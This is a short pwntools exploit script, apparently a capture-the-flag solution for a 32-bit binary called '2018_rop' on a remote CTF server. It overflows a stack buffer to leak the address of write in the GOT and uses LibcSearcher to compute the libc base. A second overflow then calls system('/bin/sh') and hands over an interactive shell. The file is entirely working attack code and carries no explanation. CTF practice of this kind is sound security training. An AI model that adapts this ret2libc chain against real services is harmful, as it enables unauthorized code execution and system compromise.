#coding:utf-8
from pwn import *
from LibcSearcher import *
import pwnlib
# sh = process("./2018_rop")
sh = remote("node3.buuoj.cn",25660)
elf = ELF("./2018_rop")
main_addr = elf.symbols['main']
write_plt = elf.plt['write']
write_got = elf.got['write']
payload = 'a' *0x88 + 'a' * 4 + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(0x4) 
sh.sendline(payload)
write_got = u32(sh.recv())
log.info("success get write_gor:0x%x"%write_got)
libc = LibcSearcher('write',write_got)
libc_base = write_got - libc.dump('write')
system_addr = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')
payload = 'a' *0x88 + 'a' * 4 + p32(system_addr) * 2 + p32(bin_sh)
sh.sendline(payload)
sh.interactive()